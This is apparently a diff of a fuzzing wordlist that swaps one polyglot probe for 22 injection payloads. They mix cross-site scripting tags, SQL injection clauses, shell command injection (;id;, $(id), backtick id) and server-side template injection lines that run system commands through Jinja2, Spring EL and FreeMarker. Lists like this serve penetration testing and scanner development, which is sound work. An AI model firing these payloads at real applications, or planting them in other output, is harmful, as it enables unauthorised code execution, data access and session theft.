@@ -1,1 +1,22 @@
-'";!--"<XSS>=&{()}\`${7*7}{{7*7}}<%= 7*7 %>;sleep 5||sleep 5||`sleep 5`&&sleep 5&&id
+'"><script>alert(1)</script>{{ 7*7 }}; id; OR 1=1--
+'"><img src=x onerror=alert(1)>{{ 7*7 }};id; OR 1=1--
+'"><svg onload=alert(1)>{{7*7}}; id; OR 1=1--
+'"><xss>{{7*7}};id; OR 1=1--
+${{7*7}}<script>alert(1)</script>; id; OR 1=1--
+#{7*7}'"><script>alert(1)</script>; id; OR 1=1--
+<%= 7*7 %>'"><script>alert(1)</script>; id; OR 1=1--
+{{7*7}} OR 1=1--; id;<script>alert(1)</script>
+${7*7} OR 1=1; id; alert(1)
+<% 7*7 %>' OR '1'='1; id;
+{{7*7}}' UNION SELECT '<script>alert(1)</script>',NULL; id; --
+{{config.__class__.__init__.__globals__['os'].system('id')}}; OR 1=1'"><script>alert(1)</script>
+{{''.__class__.mro()[2].__subclasses__()}}; OR 1=1'"><script>alert(1)</script>
+${T(java.lang.Runtime).getRuntime().exec('id')}'"><script>alert(1)</script>; OR 1=1--
+#{T(java.lang.Runtime).getRuntime().exec('id')}'"><script>alert(1)</script>; OR 1=1--
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }'"><script>alert(1)</script>
+'"><img/src=x/onerror=alert(1)>{{7*7}};id;OR 1=1--
+;ls;'><script>alert(1)</script>{{ 7*7 }}' UNION SELECT NULL--
+;id;| ls |'"><img src=x onerror=alert(1)>{{7*7}}' OR 1=1--
+`id`'"><svg onload=alert(1)>{{7*7}}' OR '1'='1
+$(id)'"><body onload=alert(1)>{{7*7}}' OR 1=1#
+;id;&& echo hi'"><details open ontoggle=alert(1)>{{7*7}}' AND 1=1--
